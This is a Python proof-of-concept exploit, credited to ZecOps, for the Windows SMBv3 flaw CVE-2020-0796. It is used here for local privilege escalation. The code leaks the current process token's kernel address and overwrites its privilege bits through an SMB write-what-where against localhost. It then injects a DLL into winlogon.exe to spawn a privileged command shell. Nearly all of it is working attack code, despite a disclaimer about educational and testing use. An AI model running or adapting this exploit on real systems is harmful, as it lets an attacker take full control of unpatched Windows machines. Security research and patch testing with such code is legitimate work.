# CVE-2020-0796 Local Privilege Escalation POC
# (c) 2020 ZecOps, Inc. - https://www.zecops.com - Find Attackers' Mistakes
# Intended only for educational and testing in corporate environments.
# ZecOps takes no responsibility for the code, use at your own risk.
# Based on the work of Alexandre Beaulieu:
# https://gist.github.com/alxbl/2fb9a0583c5b88db2b4d1a7f2ca5cdda

import sys
import random
import binascii
import struct
import os
import subprocess
import pathlib

from write_what_where import write_what_where

from ctypes import *
from ctypes.wintypes import *

# Shorthands for some ctypes stuff.
kernel32 = windll.kernel32
ntdll = windll.ntdll
psapi = windll.psapi
advapi32 = windll.advapi32
OpenProcessToken = advapi32.OpenProcessToken

# Constants.
STATUS_SUCCESS = 0
STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
STATUS_INVALID_HANDLE = 0xC0000008
TOKEN_QUERY = 8
SystemExtendedHandleInformation = 64

NTSTATUS = DWORD
PHANDLE = POINTER(HANDLE)
PVOID = LPVOID = ULONG_PTR = c_void_p

# Function signature helpers.
ntdll.NtQuerySystemInformation.argtypes = [DWORD, PVOID, ULONG, POINTER(ULONG)]
ntdll.NtQuerySystemInformation.restype = NTSTATUS

advapi32.OpenProcessToken.argtypes = [HANDLE, DWORD , POINTER(HANDLE)]
advapi32.OpenProcessToken.restype  = BOOL

# Structures for NtQuerySystemInformation.
class SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX(Structure):
    _fields_ = [
        ("Object", PVOID),
        ("UniqueProcessId", PVOID),
        ("HandleValue", PVOID),
        ("GrantedAccess", ULONG),
        ("CreatorBackTraceIndex", USHORT),
        ("ObjectTypeIndex", USHORT),
        ("HandleAttributes", ULONG),
        ("Reserved", ULONG),
    ]
class SYSTEM_HANDLE_INFORMATION_EX(Structure):
    _fields_ = [
        ("NumberOfHandles", PVOID),
        ("Reserved", PVOID),
        ("Handles", SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * 1),
    ]


def find_handles(pid, data):
    """
    Parses the output of NtQuerySystemInformation to find handles associated
    with the given PID.
    """
    header = cast(data, POINTER(SYSTEM_HANDLE_INFORMATION_EX))
    nentries = header[0].NumberOfHandles
    print('[+] Leaking access token address')

    handles = []
    data = bytearray(data[16:])

    # Manually unpacking the struct because of issues with ctypes.parse
    while nentries > 0:
        p = data[:40]
        e = struct.unpack('<QQQLHHLL', p)
        nentries -= 1
        data = data[40:]
        hpid = e[1]
        handle = e[2]

        if hpid != pid: continue
        handles.append((e[1], e[0], e[2]))

    return handles

def get_token_address():
    """
    Leverage userland APIs to leak the current process' token address in kernel
    land.
    """
    hProc = HANDLE(kernel32.GetCurrentProcess())
    pid = kernel32.GetCurrentProcessId()
    print('[+] Current PID: ' + str(pid))

    h = HANDLE()

    res = OpenProcessToken(hProc, TOKEN_QUERY, byref(h))

    if res == 0:
        print('[-] Error getting token handle: ' + str(kernel32.GetLastError()))
    else:
        print('[+] Token Handle: ' + str(h.value))

    # Find the handles associated with the current process
    q = STATUS_INFO_LENGTH_MISMATCH
    out = DWORD(0)
    sz = 0
    while q == STATUS_INFO_LENGTH_MISMATCH:
        sz += 0x1000
        handle_info = (c_ubyte * sz)()
        q = ntdll.NtQuerySystemInformation(SystemExtendedHandleInformation, byref(handle_info), sz, byref(out))

    # Parse handle_info to retrieve handles for the current PID
    handles = find_handles(pid, handle_info)
    hToken = list(filter(lambda x: x[0] == pid and x[2] == h.value, handles))
    if len(hToken) != 1:
        print('[-] Could not find access token address!')
        return None
    else:
        pToken = hToken[0][1]
        print('[+] Found token at ' + hex(pToken))
    return pToken

def exploit():
    """
    Exploits the bug to escalate privileges.

    Reminder:
    0: kd> dt nt!_SEP_TOKEN_PRIVILEGES
       +0x000 Present          : Uint8B
       +0x008 Enabled          : Uint8B
       +0x010 EnabledByDefault : Uint8B
    """
    token = get_token_address()
    if token is None: sys.exit(-1)

    what = b'\xFF' * 8 * 3
    where = token + 0x40

    print('[+] Writing full privileges on address %x' % (where))

    write_what_where('127.0.0.1', what, where)

    print('[+] All done! Spawning a privileged shell.')
    print('[+] Check your privileges: !token %x' % (token))

    dll_path = pathlib.Path(__file__).parent.absolute().joinpath('spawn_cmd.dll')
    subprocess.call(['Injector.exe', '--process-name', 'winlogon.exe', '--inject', dll_path], stdout=open(os.devnull, 'wb'))

if __name__ == "__main__":
    exploit()
